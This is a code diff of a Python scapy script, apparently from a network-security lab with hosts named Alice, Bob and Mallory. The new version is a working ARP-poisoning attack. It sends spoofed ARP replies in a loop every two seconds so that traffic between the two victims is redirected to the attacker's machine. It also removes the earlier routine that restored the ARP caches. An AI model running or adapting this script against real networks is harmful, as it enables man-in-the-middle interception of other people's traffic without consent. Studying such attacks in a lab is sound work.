@@ -1,45 +1,28 @@
-from pprint import pprint
-from scapy.all import ARP, send, AsyncSniffer, Packet, Raw
-from scapy.layers.http import HTTPRequest
+from scapy.all import Ether, ARP, sendp
 import time
 
-ALICE_IP = '172.31.0.2'
-ALICE_MAC = '02:42:ac:1f:00:02'
-BOB_IP = '172.31.0.3'
-BOB_MAC = '02:42:ac:1f:00:03'
-MALLORY_IP = '172.31.0.4'
-MALLORY_MAC = '02:42:ac:1f:00:04'
+# IP Addresses
+alice_ip = "172.31.0.2"
+bob_ip = "172.31.0.3"
 
-def process_packet(pkt: Packet):
-    """ Process the packets """
-    pass
+# MAC Addresses
+alice_mac = "02:42:ac:1f:00:02"
+bob_mac = "02:42:ac:1f:00:03"
 
-def clean():
-    print("\nStopping ARP poisoning, returning caches to normal state...")
-    send(ARP(op='is-at', pdst='', psrc='',
-         hwsrc=''), verbose=False)
-    send(ARP(op='is-at', pdst='', psrc='',
-         hwsrc=''), verbose=False)
+def spoof():
+    # 1. Tell Alice that Bob is at Mallory's MAC
+    # We create an Ethernet frame (Ether) destined for Alice's MAC
+    alice_packet = Ether(dst=alice_mac) / ARP(op=2, pdst=alice_ip, hwdst=alice_mac, psrc=bob_ip)
+    sendp(alice_packet, verbose=False)
+    
+    # 2. Tell Bob that Alice is at Mallory's MAC
+    bob_packet = Ether(dst=bob_mac) / ARP(op=2, pdst=bob_ip, hwdst=bob_mac, psrc=alice_ip)
+    sendp(bob_packet, verbose=False)
 
-def main() -> None:
-    """ ARP Poisoning and sniffing """
-    sniffer = AsyncSniffer(iface='eth0', prn=process_packet,
-                         store=False)
-    try:
-        sniffer.start()
-        print('Starting poisoning')
-        while True:
-
-            send(ARP(op='is-at', pdst='',
-                 psrc='', hwsrc=''), verbose=False)
-            send(ARP(op='is-at', pdst='',
-                 psrc='', hwsrc=''), verbose=False)
-
-            time.sleep(2)
-    except KeyboardInterrupt:
-        print('Keyboard interrupt')
-        sniffer.stop()
-    clean()
-
-if __name__ == '__main__':
-    main()
+print("ARP Poisoning started... (Warnings should be gone now)")
+try:
+    while True:
+        spoof()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\nStopping.")
